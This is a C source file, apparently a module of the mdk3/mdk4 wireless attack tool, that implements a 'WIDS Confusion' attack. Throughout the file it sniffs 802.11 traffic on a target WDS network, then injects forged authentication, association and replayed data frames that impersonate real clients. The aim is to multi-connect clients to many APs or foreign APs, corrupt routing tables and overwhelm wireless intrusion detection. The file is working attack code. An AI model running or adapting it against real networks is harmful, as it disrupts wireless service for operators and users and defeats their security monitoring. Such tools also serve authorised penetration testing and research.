#include <stdio.h>
#include <string.h>
#include <inttypes.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include <pthread.h>

#include "wids.h"
#include "../osdep.h"
#include "../helpers.h"
#include "../channelhopper.h"
#include "../linkedlist.h"

#define WIDS_MODE 'w'
#define WIDS_NAME "WIDS Confusion"
#define WIDS_MAX_RETRIES 10

struct wids_options {
  char *target;
  int zerochaos;
  int speed;
  int aps;
  int foreign_aps;
  int clients;
  int auths;
  int deauths;
};

//Global things, shared by packet creation and stats printing
struct clistwidsap *targets = NULL, *foreign = NULL, *belongsto = NULL;
struct clistwidsclient *target_clients = NULL;

void wids_shorthelp()
{
  printf("  Confuse/Abuse Intrusion Detection and Prevention Systems by\n");
  printf("  cross-connecting clients to multiple WDS nodes or fake rogue APs.\n");
}

void wids_longhelp()
{
  printf( "  Confuse/Abuse Intrusion Detection and Prevention Systems by\n"
	  "  cross-connecting clients to multiple WDS nodes or fake rogue APs.\n"
	  "  Confuses a WDS with multi-authenticated clients which messes up routing tables\n"
	  "      -e <SSID>\n"
	  "         SSID of target WDS network\n"
	  "      -c [chan,chan,...,chan[:speed]]\n"
	  "         Enable channel hopping. When -c h is given, mdk3 will hop an all\n"
	  "         14 b/g channels. Channel will be changed every 3 seconds,\n"
	  "         if speed is not specified. Speed value is in milliseconds!\n"
	  "      -z\n"
	  "         activate Zero_Chaos' WIDS exploit\n"
	  "         (authenticates clients from a WDS to foreign APs to make WIDS go nuts)\n"
	  "      -s <pps>\n"
	  "         Set speed in packets per second (Default: 100)\n");
}

void *wids_parse(int argc, char *argv[]) {
  int opt, speed;
  char *speedstr;
  struct wids_options *wopt = malloc(sizeof(struct wids_options));

  wopt->target = NULL;
  wopt->zerochaos = 0;
  wopt->speed = 100;
  wopt->aps = wopt->clients = wopt->auths = wopt->deauths = wopt->foreign_aps = 0;

  while ((opt = getopt(argc, argv, "e:c:zs:")) != -1) {
    switch (opt) {
      case 'e':
	if (strlen(optarg) > 255) {
	  printf("ERROR: SSID too long\n"); return NULL;
	} else if (strlen(optarg) > 32) {
	  printf("NOTE: Using Non-Standard SSID with length > 32\n");
	}
	wopt->target = malloc(strlen(optarg) + 1); strcpy(wopt->target, optarg);
      break;
      case 'c':
  	speed = 3000000;
  	speedstr = strrchr(optarg, ':');
  	if (speedstr != NULL) {
  	  speed = 1000 * atoi(speedstr + 1);
  	}
  	if (optarg[0] == 'h') {
  	  init_channel_hopper(NULL, speed);
  	} else {
  	  init_channel_hopper(optarg, speed);
  	}
      break;
      case 'z':
        wopt->zerochaos = 1;
      break;
      case 's':
        wopt->speed = (unsigned int) atoi(optarg);
      break;
      default:
	wids_longhelp();
	printf("\n\nUnknown option %c\n", opt);
	return NULL;
    }
  }

  if (! wopt->target) {
    wids_longhelp();
    printf("\n\nTarget must be specified!\n");
    return NULL;
  }

  return (void *) wopt;
}

void wids_sniffer(void *options) {
  struct wids_options *wopt = (struct wids_options *) options;
  struct packet sniff;
  struct ieee_hdr *hdr;
  char *ssid;
  struct ether_addr *bssid, *client;
  struct auth_fixed *auth;
  struct clistwidsclient *wclient;

  while(1) {
    sniff = osdep_read_packet();
    hdr = (struct ieee_hdr *) sniff.data;

    switch (hdr->type) {
      case IEEE80211_TYPE_BEACON:
        ssid = get_ssid(&sniff, NULL);
        bssid = get_bssid(&sniff);
        if (!strcmp(ssid, wopt->target)) {
          if (! search_bssid(targets, *bssid)) {
            targets = add_to_clistwidsap(targets, *bssid, osdep_get_channel(), get_capabilities(&sniff), ssid);
            printf("\rFound AP for target network: "); print_mac(*bssid); printf(" on channel %d\n", osdep_get_channel());
            wopt->aps++;
          }
        } else {
          if (wopt->zerochaos && (! search_bssid(foreign, *bssid))) {
            foreign = add_to_clistwidsap(foreign, *bssid, osdep_get_channel(), get_capabilities(&sniff), ssid);
            printf("\rFound foreign AP "); print_mac(*bssid); printf(" in network %s on channel %d\n", ssid, osdep_get_channel());
            wopt->foreign_aps++;
          }
        }
        free(ssid);
      break;
      case IEEE80211_TYPE_DATA:
      case IEEE80211_TYPE_QOSDATA:
        client = NULL;
        if ((hdr->flags & 0x03) == 0x01) {
          client = get_source(&sniff);
        } else if ((hdr->flags & 0x03) == 0x02) {
          client = get_destination(&sniff);
        }
        if (client) {
          bssid = get_bssid(&sniff);
          if ((belongsto = search_bssid(targets, *bssid))) {
            if (! search_client(target_clients, *client)) {
              target_clients = add_to_clistwidsclient(target_clients, *client, 0, sniff.data, sniff.len, get_seqno(&sniff), NULL); //NULL: doesnt yet belong to any AP
              printf("\rFound client "); print_mac(*client); printf(" on AP "); print_mac(*bssid); printf("\n");
              wopt->clients++;
            }
          }
        }
      break;
      case IEEE80211_TYPE_AUTH:
        auth = (struct auth_fixed *) (sniff.data + sizeof(struct ieee_hdr));
        client = get_destination(&sniff);
        bssid = get_bssid(&sniff);
        if ((auth->seq == htole16((uint16_t) 2)) && (auth->status == 0)) {
          wclient = search_client(target_clients, *client);
          if (wclient) {
            if (MAC_MATCHES(*bssid, wclient->bssid->bssid))     //Doesnt match: Real client tried connecting somewhere else, ignore
              if (wclient->status == 0) wclient->status = 1;
          }
        }
      break;
      case IEEE80211_TYPE_ASSOCRES:
        client = get_destination(&sniff);
        bssid = get_bssid(&sniff);
        wclient = search_client(target_clients, *client);
        if (wclient && (wclient->status == 1)) {
          if (MAC_MATCHES(*bssid, wclient->bssid->bssid)) {
            wclient->status = 2;
            wopt->auths++;
            printf("\rConnected "); print_mac(*client); printf(" to AP "); print_mac(wclient->bssid->bssid); printf("\n");
          }
        }
      break;
      case IEEE80211_TYPE_DISASSOC:
      case IEEE80211_TYPE_DEAUTH:
        client = get_destination(&sniff);
        bssid = get_bssid(&sniff);
        wclient = search_client(target_clients, *client);
        if (wclient) {
          if (wclient->bssid && MAC_MATCHES(*bssid, wclient->bssid->bssid)) {
            wclient->status = 0;
            wclient->bssid = NULL;
            printf("\rClient "); print_mac(*client); printf(" kicked from fake-connected AP "); print_mac(*bssid); printf("\n");
          } else {
            printf("\rClient "); print_mac(*client); printf(" kicked from original AP "); print_mac(*bssid); printf("\n");
          }
          wopt->deauths++;
        }
      break;
    }
  }
}

struct clistwidsclient *handle_retries(struct clistwidsclient *in) {
  if (!in) return NULL;

  in->retries++;
  if (in->retries > WIDS_MAX_RETRIES) {
    in->bssid = NULL;
    in->status = 3;     //Postpone client to the end
    in->retries = 0;
    return NULL;
  }

  //We also hate WIDS vendors here :D
  set_seqno(NULL, in->seq); //Have a nice day
  in->seq++;

  return in;
}

struct packet wids_getpacket(void *options) {
  static int wids_init = 0;
  static pthread_t sniffer;
  struct wids_options *wopt = (struct wids_options *) options;
  struct packet pkt;
  struct clistwidsclient *wclient;
  struct ieee_hdr *hdr;

  if (!wids_init) {
    printf("\nWaiting 10 seconds for initialization...\n");


    pthread_create(&sniffer, NULL, (void *) wids_sniffer, (void *) wopt);

        for (wids_init=0; wids_init<10; wids_init++) {
            sleep(1);
            printf("\rAPs found: %d   Clients found: %d", wopt->aps, wopt->clients);
        }

        while (! wopt->aps) {
            printf("\rNo APs have been found yet, waiting...\n");
            sleep(1);
        }
        while (wopt->zerochaos && (! wopt->foreign_aps)) {
            printf("\rNo foreign APs have been found yet, waiting...\n");
            sleep(1);
        }
        while (! wopt->clients) {
            printf("\rOnly APs found, no clients yet, waiting...\n");
            sleep(1);
        }
        wids_init = 1;
  }

  while(1) {
    sleep_till_next_packet(wopt->speed);
    target_clients = shuffle_widsclients(target_clients);

    //Associate a client that just authenticated
    wclient = search_status_widsclient(target_clients, 1, osdep_get_channel());
    wclient = handle_retries(wclient);
    if (wclient) return create_assoc_req(wclient->mac, wclient->bssid->bssid, wclient->bssid->capa, wclient->bssid->ssid, 54);

    //Send data as client that just connected
    wclient = search_status_widsclient(target_clients, 2, osdep_get_channel());
    wclient = handle_retries(wclient);
    if (wclient) { //injecting data
      memcpy(pkt.data, wclient->data, wclient->data_len);
      pkt.len = wclient->data_len;
      hdr = (struct ieee_hdr *) pkt.data;
      hdr->flags &= 0xFC;  // Clear DS field
      hdr->flags |= 0x01; // Set ToDS bit
      hdr->addr1 = wclient->bssid->bssid;
      hdr->addr2 = wclient->mac;
      MAC_SET_BCAST(hdr->addr3);
      wclient->status = 3;
      return pkt;
    }

    //Search idle client, auth to random AP, if nobody idle, connect already connected stations to even more APs
    wclient = search_status_widsclient(target_clients, 0, -1);
    if (!wclient) wclient = search_status_widsclient(target_clients, 3, -1);
    if (wclient) {
      wclient->retries = 0;
      if (wopt->zerochaos) {
        foreign = shuffle_widsaps(foreign);
        wclient->bssid = search_bssid_on_channel(foreign, osdep_get_channel());
      } else {
        targets = shuffle_widsaps(targets);
        wclient->bssid = search_bssid_on_channel(targets, osdep_get_channel());
      }
      if (wclient->bssid) return create_auth(wclient->bssid->bssid, wclient->mac, 0);
    }

    printf("\rAll clients stuck in Authentication cycles, waiting for timeouts.");
  }

  pkt.len = 0;
  return pkt;
}

void wids_print_stats(void *options) {
  struct wids_options *wopt = (struct wids_options *) options;

  printf("\rAPs found: %d   Clients found: %d   Completed Auth-Cycles: %d   Caught Deauths: %d\n", wopt->aps, wopt->clients, wopt->auths, wopt->deauths);
}

void wids_perform_check(void *options) {
  //Nothing to check
  options = options; //Avoid unused warning
}

struct attacks load_wids() {
  struct attacks this_attack;
  char *wids_name = malloc(strlen(WIDS_NAME) + 1);
  strcpy(wids_name, WIDS_NAME);

  this_attack.print_shorthelp = (fp) wids_shorthelp;
  this_attack.print_longhelp = (fp) wids_longhelp;
  this_attack.parse_options = (fpo) wids_parse;
  this_attack.get_packet = (fpp) wids_getpacket;
  this_attack.print_stats = (fps) wids_print_stats;
  this_attack.perform_check = (fps) wids_perform_check;
  this_attack.mode_identifier = WIDS_MODE;
  this_attack.attack_name = wids_name;

  return this_attack;
}
